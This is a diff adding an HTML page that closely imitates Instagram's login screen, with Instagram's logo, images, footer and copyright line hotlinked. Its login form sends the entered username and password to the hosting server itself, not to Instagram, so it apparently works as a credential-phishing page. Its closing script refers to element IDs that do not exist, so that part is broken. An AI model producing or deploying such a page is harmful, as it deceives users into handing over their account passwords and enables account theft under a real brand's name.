@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/316982736c49.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* CSS Reset / Normalize (Simplified) */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Root Variables for easier theme management */
+        :root {
+            --ig-blue: #0095F6;
+            --ig-border: #DBDBDB;
+            --ig-background-light: #FAFAFA;
+            --ig-text-secondary: #8E8E8E;
+            --ig-text-primary: #262626;
+            --ig-facebook-blue: #385185;
+            --ig-link-blue: #00376B;
+            --ig-button-disabled: rgba(0, 149, 246, 0.3);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff; /* Default to white for mobile first */
+            display: flex;
+            flex-direction: column;
+            /* Mobile par content top se start hoga, desktop par adjust karenge */
+            justify-content: flex-start; /* Default to start for mobile */
+            align-items: center; /* Centers horizontally if content is narrower than body */
+            min-height: 100vh; /* Ensure body takes full viewport height */
+            margin: 0;
+            color: var(--ig-text-primary);
+            overflow-x: hidden; /* No horizontal scroll */
+            font-size: 14px;
+            line-height: 18px;
+        }
+
+        /* Mobile View (Default styles, will be overridden by desktop media query) */
+        .main-content-area {
+            flex-grow: 1; /* Allows this area to take up available space */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Align content to top on mobile */
+            width: 100%;
+            padding: 0 20px; /* Horizontal padding */
+            box-sizing: border-box;
+            max-width: 350px; /* Constrain content width for mobile */
+            margin-top: 20px; /* Space from top for language selector */
+            padding-bottom: 20px; /* Add some padding at the bottom for mobile */
+        }
+
+        .language-top {
+            display: flex; /* Show by default for mobile */
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px; /* Space before Instagram logo */
+            font-size: 12px;
+            color: var(--ig-text-secondary);
+        }
+        .language-top select {
+            border: none;
+            background-color: transparent;
+            color: var(--ig-text-secondary);
+            font-size: 12px;
+            appearance: none;
+            padding-right: 15px;
+            cursor: pointer;
+            outline: none;
+        }
+        .language-top i {
+            font-size: 10px;
+            color: var(--ig-text-secondary);
+            margin-left: -10px;
+            pointer-events: none;
+        }
+
+        .phone-mockup {
+            display: none; /* Hide phone mockup on mobile */
+        }
+
+        .login-card {
+            background-color: #fff;
+            border: none; /* No border on mobile */
+            border-radius: 1px;
+            padding: 0; /* Remove padding, will use element-specific margins */
+            text-align: center;
+            width: 100%;
+            margin-bottom: 12px; /* Space between login and signup */
+            box-sizing: border-box;
+        }
+
+        .instagram-logo {
+            width: 175px;
+            margin: 22px auto 12px; /* Top, Left/Right, Bottom */
+        }
+
+        .facebook-login-btn-mobile {
+            display: flex; /* Show on mobile */
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 8px 16px;
+            background-color: var(--ig-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            gap: 8px;
+            margin-top: 12px; /* Space below logo */
+        }
+        .facebook-login-btn-mobile i {
+            font-size: 16px;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 18px 0;
+            color: var(--ig-text-secondary);
+            font-weight: 600;
+            font-size: 13px;
+            text-transform: uppercase;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--ig-border);
+        }
+
+        .or-divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .or-divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .login-form {
+            margin-top: 0; /* Adjusted for mobile */
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 9px 8px 7px 8px;
+            border: 1px solid var(--ig-border);
+            border-radius: 3px;
+            background-color: var(--ig-background-light);
+            font-size: 12px;
+            line-height: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .login-form input:focus {
+            border-color: #A8A8A8;
+        }
+
+        .login-form input::placeholder {
+            color: var(--ig-text-secondary);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 8px 16px;
+            background-color: var(--ig-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 8px;
+            opacity: 0.7;
+            transition: opacity 0.2s ease-in-out;
+        }
+
+        .login-button:enabled {
+            opacity: 1;
+        }
+
+        .login-button:enabled:hover {
+            background-color: #0085e6;
+        }
+
+        .login-button:disabled {
+            cursor: default;
+            background-color: var(--ig-button-disabled);
+        }
+
+        .facebook-login-btn-desktop {
+            display: none; /* Hide desktop Facebook button on mobile */
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: var(--ig-link-blue);
+            text-decoration: none;
+            margin-top: 12px;
+            display: block;
+        }
+
+        .signup-card {
+            background-color: #fff;
+            border: none; /* No border on mobile */
+            border-radius: 1px;
+            padding: 25px 0;
+            text-align: center;
+            width: 100%;
+            font-size: 14px;
+            box-sizing: border-box;
+            margin-bottom: 10px; /* space between signup and get app */
+        }
+
+        .signup-card a {
+            color: var(--ig-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .terms-text {
+            font-size: 12px;
+            color: var(--ig-text-secondary);
+            margin: 20px 0;
+            text-align: center;
+            line-height: 1.5;
+            max-width: 300px;
+        }
+        .terms-text a {
+            color: var(--ig-link-blue);
+            text-decoration: none;
+        }
+
+        .get-app-section {
+            display: none; /* Hidden by default on mobile */
+        }
+
+        .footer {
+            flex-shrink: 0; /* Prevent footer from shrinking */
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            color: var(--ig-text-secondary);
+            font-size: 12px;
+            margin-top: 0; /* No auto margin on mobile */
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: var(--ig-text-secondary);
+            text-decoration: none;
+            margin: 0 8px 7px;
+            line-height: 18px;
+        }
+
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .language-selector select {
+            border: none;
+            background-color: transparent;
+            color: var(--ig-text-secondary);
+            font-size: 12px;
+            appearance: none;
+            padding-right: 20px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .language-selector i {
+            font-size: 10px;
+            color: var(--ig-text-secondary);
+            margin-left: -15px;
+            pointer-events: none;
+        }
+
+        /* Desktop View (Min-width 768px) */
+        @media (min-width: 768px) {
+            body {
+                background-color: var(--ig-background-light); /* Grey background for desktop */
+                justify-content: center; /* This will center the main-content-area and footer */
+            }
+
+            .main-content-area {
+                flex-grow: 0; /* Desktop par grow hone ki zaroorat nahi */
+                flex-direction: column; /* Keep column layout for desktop */
+                justify-content: flex-start; /* Content ko top se start karo */
+                align-items: center; /* Horizontally center content */
+                padding: 0;
+                max-width: none;
+                margin-top: 50px; /* Thoda space top se, jaisa real site par hai */
+                padding-bottom: 50px; /* Thoda space bottom se, for scrollability */
+            }
+
+            .language-top {
+                display: none; /* Hide top language selector on desktop */
+            }
+
+            .phone-mockup {
+                display: none; /* Ensure phone mockup is always hidden on desktop */
+            }
+
+            .login-card {
+                border: 1px solid var(--ig-border); /* Add border for desktop */
+                padding: 10px 40px; /* Restore desktop padding */
+                width: 350px; /* Fixed width for login card */
+                margin-bottom: 10px; /* Space between login and signup */
+            }
+
+            .instagram-logo {
+                margin: 22px auto 12px;
+            }
+
+            .facebook-login-btn-mobile {
+                display: none; /* Hide mobile Facebook button on desktop */
+            }
+
+            .facebook-login-btn-desktop {
+                display: block; /* Show desktop Facebook button as block */
+                background-color: transparent;
+                color: var(--ig-facebook-blue);
+                border: none;
+                font-weight: 600;
+                cursor: pointer;
+                padding: 0;
+                margin-top: 10px;
+                font-size: 14px;
+                line-height: 20px;
+                text-decoration: none; /* Remove underline */
+                display: flex; /* Use flex to align icon and text */
+                justify-content: center;
+                align-items: center;
+                gap: 8px;
+            }
+            .facebook-login-btn-desktop i {
+                font-size: 16px;
+            }
+
+            .terms-text {
+                display: none; /* Hide terms text on desktop */
+            }
+
+            .signup-card {
+                border: 1px solid var(--ig-border); /* Add border for desktop */
+                padding: 25px 0;
+                width: 350px; /* Fixed width for signup card */
+                margin-top: 0;
+                margin-bottom: 10px; /* Space before Get the App */
+            }
+
+            .get-app-section {
+                display: block; /* Show "Get the app" section on desktop */
+                margin-top: 10px;
+                text-align: center;
+                font-size: 14px;
+            }
+            .app-badges {
+                display: flex;
+                justify-content: center;
+                gap: 8px;
+                margin-top: 15px;
+            }
+            .app-badges img {
+                height: 40px;
+                cursor: pointer;
+            }
+
+            .footer {
+                margin-top: 60px; /* Fixed margin to push footer down, allowing scrollability */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content-area">
+        <div class="language-top">
+            <select>
+                <option value="en">English</option>
+                <option value="hi">हिंदी</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+            </select>
+            <i class="fas fa-chevron-down"></i>
+        </div>
+
+        <div class="phone-mockup">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fe2540684ab2.png" alt="Instagram screenshot 1">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d8b9e6e225f.png" alt="Instagram screenshot 2">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/c1f6b579564f.png" alt="Instagram screenshot 3">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/ce7320078021.png" alt="Instagram screenshot 4">
+        </div>
+
+        <div class="main-wrapper">
+            <div class="login-card">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="instagram-logo">
+
+                <button class="facebook-login-btn-mobile">
+                    <i class="fab fa-facebook-square"></i> Continue with Facebook
+                </button>
+
+                <div class="or-divider">OR</div>
+                <form class="login-form" method="POST" action="/">
+    <div class="input-group">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+    </div>
+    <div class="input-group">
+        <input type="password" name="password" placeholder="Password" required>
+    </div>
+    <button type="submit" class="login-button">Log In</button>
+</form>
+
+
+                <a href="#" class="facebook-login-btn-desktop">
+                    <i class="fab fa-facebook-square"></i> Log in with Facebook
+                </a>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+
+            <div class="signup-card">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+
+            <div class="terms-text">
+                By continuing, you agree to Instagram's <a href="#">Terms</a>
+                of Use and <a href="#">Privacy Policy</a>.
+            </div>
+
+            <div class="get-app-section">
+                Get the app.
+                <div class="app-badges">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png" alt="Download on the App Store">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="language-selector">
+            <select>
+                <option value="en">English</option>
+                <option value="hi">हिंदी</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+            </select>
+            <i class="fas fa-chevron-down"></i>
+            <span>© 2025 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <script>
+        const usernameInput = document.getElementById('usernameInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginButton = document.querySelector('.login-button');
+
+        function checkInputs() {
+            if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+
+        checkInputs();
+    </script>
+</body>
+</html>
